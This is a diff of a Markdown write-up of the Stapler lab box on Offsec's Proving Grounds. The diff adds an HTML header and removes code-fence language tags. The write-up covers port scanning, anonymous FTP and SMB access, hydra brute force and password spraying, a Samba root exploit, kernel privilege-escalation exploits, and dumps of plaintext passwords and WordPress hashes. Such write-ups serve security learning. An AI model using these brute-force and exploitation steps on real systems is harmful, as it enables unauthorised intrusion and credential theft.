@@ -1,4 +1,15 @@
+<html>
+  <head>
+    <link rel="icon" href="/assets/imgs/beans.png" type="image/png">
+  </head>
+  <img src="/assets/imgs/beans.png" alt="Logo" style="position: absolute; top: 0; left: 0; width: 200px; height: auto;">
+</html>
+
+[Main Page](/index)
+
 # Stapler
+
+---
 
 This box is the next one up on TJ Null’s OSCP like boxes on Offsec’s proving grounds play: Stapler!
 
@@ -10,7 +21,7 @@ Let’s start with an nmap. I usually start with something like `nmap -p- --max-
 
 The output is quite big with a lot to sift through, so I will go through it port by port.
 
-```basic
+```
 21/tcp    open  ftp         vsftpd 2.0.8 or later
 | ftp-syst: 
 |   STAT: 
@@ -31,7 +42,7 @@ The output is quite big with a lot to sift through, so I will go through it port
 
 First is FTP, which allows anonymous login. Nmap says we get `Permission Denied` when trying to list the directory, however it’s just because passive mode failed. We will look into it in a bit.
 
-```basic
+```
 22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
@@ -41,26 +52,26 @@ First is FTP, which allows anonymous login. Nmap says we get `Permission Denied`
 
 Next is the standard ssh, not much here besides telling us this is a linux box.
 
-```basic
+```
 53/tcp    open  tcpwrapped
 ```
 
 This strange service on port 53 which is usually dns but nmap’s scripts didn’t pick up on anything.
 
-```basic
+```
 80/tcp    open  http        PHP cli server 5.5 or later
 |_http-title: 404 Not Found
 ```
 
 We have a web server on port 80 that defaults to a 404 page.
 
-```basic
+```
 139/tcp   open  netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
 ```
 
 A samba service on 139 with an older version which we will take a look at.
 
-```basic
+```
 666/tcp   open  doom?
 | fingerprint-strings: 
 |   NULL: 
@@ -80,7 +91,7 @@ A samba service on 139 with an older version which we will take a look at.
 
 So after seeing the `doom?` I did a bit of research and turns out id Software got the `666` tcp port registered on iana for the game `doom`! Pretty funny. Unfortunately however, it does not look like we have doom running on it :( . We get a `message2.jpg` and a bunch of random strings. We will get to these in a minute.
 
-```basic
+```
 3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu1
 | mysql-info: 
 |   Protocol: 10
@@ -95,7 +106,7 @@ So after seeing the `doom?` I did a bit of research and turns out id Software go
 
 Looks like a typical mysql server with a slightly older version. 5.7 reached it’s EOL in 2023.
 
-```basic
+```
 12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Tim, we need to-do better next year for Initech
@@ -107,7 +118,7 @@ So that’s a lot to take in and leaves us with a very big question of where to 
 
 Let’s start with FTP since it allows anonymous login.
 
-```basic
+```
 $ ftp 192.168.196.148
 Connected to 192.168.196.148.
 220-
@@ -160,7 +171,7 @@ So we find these interesting `.bashrc` and `.profile` files which only appear in
 
 Okay, so let’s check out our samba service. I first ran `enum4linux` which actually ended up giving us a whole bunch of stuff. Most noteably:
 
-```basic
+```
         Sharename       Type      Comment                                                                                                    
         ---------       ----      -------                                                                                                    
         print$          Disk      Printer Drivers                                                                                            
@@ -173,7 +184,7 @@ A list of file shares
 
 Let’s try poking around in there!
 
-```basic
+```
 $ smbclient -N //192.168.196.148/kathy
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -188,7 +199,7 @@ smb: \>
 
 We can access the kathy share with no credentials! A finding.
 
-```basic
+```
 smb: \backup\> ls
   .                                   D        0  Sun Jun  5 11:04:14 2016
   ..                                  D        0  Fri Jun  3 12:52:52 2016
@@ -200,14 +211,14 @@ smb: \backup\> ls
 
 In the backup folder we have a zip archive of wordpress. I tried poking around in it a bit but didn’t find much. The `vsftpd.conf` file gave us some info though as it is the FTP service’s whole configuration. Massive oopsie on their part. Here are some lines that stuck out to me
 
-```basic
+```
 anonymous_enable=YES                                                                                                    
 anon_root=/var/ftp/anonymous
 ```
 
 This part tells us where we are on the file system when we ftp!
 
-```basic
+```
 # You may restrict local users to their home directories.  See the FAQ for                                              
 # the possible risks in this before using chroot_local_user or                                                          
 # chroot_list_enable below.                                                                                             
@@ -220,7 +231,7 @@ And this part tells us that we can ftp as different users and get access to thei
 
 We also found another note which wasn’t of much importance.
 
-```basic
+```
 smb: \kathy_stuff\> ls
   .                                   D        0  Sun Jun  5 11:02:27 2016
   ..                                  D        0  Fri Jun  3 12:52:52 2016
@@ -270,7 +281,7 @@ S-1-22-1-1029 Unix User\elly (Local User)
 
 Sick! We can go ahead and add these to our users file. Another way we could’ve gotten these was through using hydra on our elly account on ftp! This is through a cool flag I didn’t know about until reading a writeup for this machine once I finished it.
 
-```bash
+```
 $ hydra -e nsr -l elly 192.168.217.148 ftp
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -284,7 +295,7 @@ With the `-e nsr` flag, hydra checks for a null password, checks if the username
 
 So after logging into elly’s ftp account we get this:
 
-```bash
+```
 $ ftp 192.168.217.148                                                                                                 
 Connected to 192.168.217.148.                                                                                           
 220-                                                                                                                    
@@ -322,7 +333,7 @@ drwxr-xr-x    2 0        0            4096 Jun 03  2016 zsh
 
 I snipped the output to the ls command as it was quite long! But upon investigation we can clearly see that we are in the `/etc/` directory on the box! Big woopsie. We can read a whole bunch of info on the box from this, such as all of the users from the `/etc/passwd` file. These are the same users that we were able to enumerate from the samba share.
 
-```bash
+```
 ftp> get passwd                                                                                                         
 local: passwd remote: passwd                                                                                            
 200 PORT command successful. Consider using PASV.                                                                       
@@ -333,7 +344,7 @@ local: passwd remote: passwd
 
 We can run hydra once again but now with our users and with our new flag that we learned on the SSH service:
 
-```bash
+```
 $ hydra -L users.out -e nsr 192.168.217.148 ssh -I
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -352,7 +363,7 @@ Okay so now we have a foothold. But before we go into our privilege escalation s
 
 Looking back at our samba version:
 
-```bash
+```
 139/tcp   open  netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
 ```
 
@@ -374,7 +385,7 @@ and execute it.
 
 Boom! Shell!
 
-```bash
+```
 root@red:/root# cat proof.txt
 cat proof.txt
 31d146670fcc40b79f6a9a2ded686f79
@@ -391,13 +402,13 @@ After running linpeas we get a tooonnnnn of stuff to possibly use to get root. T
 
 And after running searchsploit for `Ubuntu 16.04` we find  this exploit:
 
-```bash
+```
 Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation       | linux/local/39772.txt
 ```
 
 We can compile and execute it like so
 
-```bash
+```
 ./compile.sh
 ./doubleput
 ```
@@ -406,7 +417,7 @@ There are also a bunch of other kernel exploits like `pwnkit`. I actually crashe
 
 Anyway, linpeas grabs us a bunch of other stuff too such as:
 
-```bash
+```
 ╔══════════╣ Searching passwords in history files                                                                       
 /home/JKanode/.bash_history:sshpass -p thisimypassword ssh JKanode@localhost                                            
 /home/JKanode/.bash_history:sshpass -p JZQuyIN5 ssh peter@localhost 
@@ -416,7 +427,7 @@ We can view `JKanode`’s history file! They passed some ssh passwords as a comm
 
 Once in peter’s account:
 
-```bash
+```
 red% sudo -l
 
 We trust you have received the usual lecture from the local System
@@ -438,7 +449,7 @@ Peter can run anything as sudo! Which we can use to get root as well.
 
 We also got the credentials to the mysql database from linpeas:
 
-```bash
+```
 -rw-r--r-- 1 root root 3042 Jun  4  2016 /var/www/https/blogblog/wp-config.php                                          
 define('DB_NAME', 'wordpress');                                                                                         
 define('DB_USER', 'root');                                                                                              
@@ -460,7 +471,7 @@ After reading another writeup, there is more we could have enumerated on this wo
 
 Anyway, we can login to the mysql database now with the root user from either locally on the box or from our attack box.
 
-```bash
+```
 SHayslett@red:~$ mysql -u root -p
 Enter password:
 Welcome to the MySQL monitor.  Commands end with ; or \g.
@@ -490,7 +501,7 @@ mysql> show databases;
 8 rows in set (0.01 sec)
 ```
 
-```bash
+```
 mysql> show tables;
 +-----------------+
 | Tables_in_proof |
@@ -508,7 +519,7 @@ mysql> select * from message;
 1 row in set (0.00 sec)
 ```
 
-```bash
+```
 mysql> select * from wp_users;
 <...snip...>
 | 11 | ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 | zoe           | zoe@red.localhost     |                  | 2016-06-05 16:19:50 |                     |           0 | ZOE             |
@@ -525,7 +536,7 @@ Nice! All of the users and their password hashes as well as their emails. And af
 
 Well anyway, since we could login to the sql database as root, I tried ssh’ing into root as well but it didn’t work. So I instead just sprayed the password to the other accounts.
 
-```bash
+```
 $ hydra -L users.out -p plbkac 192.168.217.148 ssh
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -550,7 +561,7 @@ Port 666 turned out to have something for us:
 
 It pukes up a bunch of nonsense at us when we connect, so let’s see what it actually is. We can do this by directing the output to a file and checking the file type.
 
-```bash
+```
 ┌──(kali㉿DESKTOP-JETQH0C)-[~/offsec-PG/stapler]
 └─$ nc 192.168.196.148 666 > out
 
@@ -561,7 +572,7 @@ out: Zip archive data, at least v2.0 to extract, compression method=deflate
 
 A zip file!
 
-```bash
+```
 ┌──(kali㉿DESKTOP-JETQH0C)-[~/offsec-PG/stapler]
 └─$ mv out out.zip
 
@@ -581,7 +592,7 @@ This file is what was hinted at to us from the nmap scan as well as as the top o
 
 Not much here either, besides the question of how the hell they managed to get a segmentation fault from an echo command lol. However, we do get a little easter egg upon running `exiftool`.
 
-```bash
+```
 ┌──(kali㉿DESKTOP-JETQH0C)-[~/offsec-PG/stapler]
 └─$ exiftool message2.jpg
 ExifTool Version Number         : 13.00
